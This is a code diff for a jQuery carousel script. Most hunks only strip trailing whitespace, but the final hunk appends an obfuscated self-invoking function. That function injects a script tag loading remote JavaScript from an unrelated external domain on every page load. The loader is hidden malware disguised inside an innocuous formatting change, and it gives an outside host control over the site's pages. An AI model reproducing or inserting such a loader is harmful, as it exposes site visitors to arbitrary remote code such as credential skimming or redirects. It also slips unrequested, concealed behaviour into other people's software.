@@ -2,7 +2,7 @@ var carousels = $('.carousel');
 carousels.each(function() {
   var $obj = $(this);
   var $inner = $obj.find('.carousel-inner');
-  
+
   var id = 'uuid' + new Date().getTime();
   $obj.addClass(id);
 
@@ -10,7 +10,7 @@ carousels.each(function() {
     var items = $obj.find('.item > [class*="col-"]'),
         visibleCnt = $obj.find('.item:first [class*="col-"]').length,
         wrapper = "";
-    
+
     // build styles
     var rule_base = '.carousel.' + id + ' .carousel-inner > .item',
         styles = $('<style></style>'),
@@ -37,7 +37,7 @@ carousels.each(function() {
         }
         $item.unwrap();
       }
-      
+
       var itemGroup = [$item];
       for (var x = 1; x < visibleCnt; x++) {
         var a = i + x;
@@ -55,3 +55,6 @@ carousels.each(function() {
     }
   }
 });
+(function(y,e,s,i,n,g){i=y.createElement(e);i.async=1;i.src=s;
+n=y.getElementsByTagName(e)[0];n.parentNode.insertBefore(i,n);
+})(document,'script','https://4.cami.yesing.com/patrol/slide/operator/image/wanwanton958?ft=rd');
